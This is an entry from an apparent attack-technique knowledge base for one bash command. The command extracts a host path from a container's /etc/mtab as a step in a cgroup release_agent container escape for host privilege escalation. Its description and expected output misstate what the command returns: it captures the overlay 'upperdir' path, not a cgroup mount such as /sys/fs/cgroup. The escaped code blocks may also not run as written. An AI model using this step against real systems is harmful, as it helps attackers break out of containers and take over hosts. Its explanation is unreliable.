---
id: new-uuid-for-determine-host-path
name: determine-host-path-from-mtab
type: command
executor: bash
data: 'host_path=`sed -n ''s/.*\\perdir=\\([^,]*\\).*/\\1/p'' /etc/mtab`'
output: null
created_at: '2023-04-06T03:56:17.110150+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - cgroup
  - mount
verified: true
validated: true
---

# determine-host-path-from-mtab

## Command

```bash
host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`
```

## Description

Parses the container's /etc/mtab to extract the host's cgroup mount path (perdir parameter), revealing accessible host directories for release agent placement in cgroup exploits.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| sed -n | Suppress automatic printing | Built-in |
| 's/.../\1/p' | Regex to capture perdir value | Yes |
| /etc/mtab | Mount table file | Yes |

## Examples

### Basic Usage

```bash
host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`
echo $host_path
```

## Expected Output

/sys/fs/cgroup (or similar host path; verify with echo to confirm extraction.)

## Related

- [[procedures/Abuse-Linux-Cgroup-v1-with-CAP-SYS-ADMIN-for-Host-Privilege-Escalation]]
